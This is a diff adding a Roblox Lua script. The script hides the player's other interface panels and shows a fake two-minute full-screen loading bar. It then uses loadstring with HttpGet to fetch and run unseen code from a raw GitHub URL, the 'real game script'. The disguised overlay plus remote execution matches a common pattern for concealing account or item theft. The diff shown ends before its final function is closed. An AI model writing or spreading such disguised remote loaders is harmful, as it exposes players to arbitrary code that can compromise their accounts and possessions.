@@ -1,0 +1,76 @@
+-- Hide inventory elements
+pcall(function()
+    for _, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v:IsA("ScreenGui") and v.Name ~= "LoadingScreen" then
+            v.Enabled = false
+        end
+    end
+end)
+
+-- Create loading UI
+local player = game.Players.LocalPlayer
+local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+loadingGui.Name = "LoadingScreen"
+loadingGui.ResetOnSpawn = false
+
+-- Full black background
+local background = Instance.new("Frame", loadingGui)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.ZIndex = 1
+
+-- Loading bar container
+local frame = Instance.new("Frame", background)
+frame.Size = UDim2.new(0.4, 0, 0.06, 0)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.BackgroundTransparency = 0.2
+frame.ZIndex = 2
+frame.ClipsDescendants = true
+
+-- Loading bar
+local bar = Instance.new("Frame", frame)
+bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+bar.BorderSizePixel = 0
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.ZIndex = 3
+
+-- Loading text
+local loadingText = Instance.new("TextLabel", background)
+loadingText.Size = UDim2.new(1, 0, 0.05, 0)
+loadingText.Position = UDim2.new(0.5, 0, 0.44, 0)
+loadingText.AnchorPoint = Vector2.new(0.5, 0)
+loadingText.Text = "Loading... 0%"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextScaled = true
+loadingText.ZIndex = 2
+
+-- Credit label
+local credit = Instance.new("TextLabel", background)
+credit.Size = UDim2.new(1, 0, 0.05, 0)
+credit.Position = UDim2.new(0.5, 0, 0.95, 0)
+credit.AnchorPoint = Vector2.new(0.5, 0)
+credit.Text = "made by: g3zmar"
+credit.TextColor3 = Color3.fromRGB(255, 255, 255)
+credit.BackgroundTransparency = 1
+credit.Font = Enum.Font.Gotham
+credit.TextScaled = true
+credit.ZIndex = 2
+
+-- Animate loading
+spawn(function()
+    for i = 1, 100 do
+        bar.Size = UDim2.new(i / 100, 0, 1, 0)
+        loadingText.Text = "Loading... " .. i .. "%"
+        wait(1.2) -- ~2 minutes total
+    end
+
+    loadingGui:Destroy() -- Remove UI
+
+    -- Load real game script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/roblox-script123/refs/heads/main/script"))()
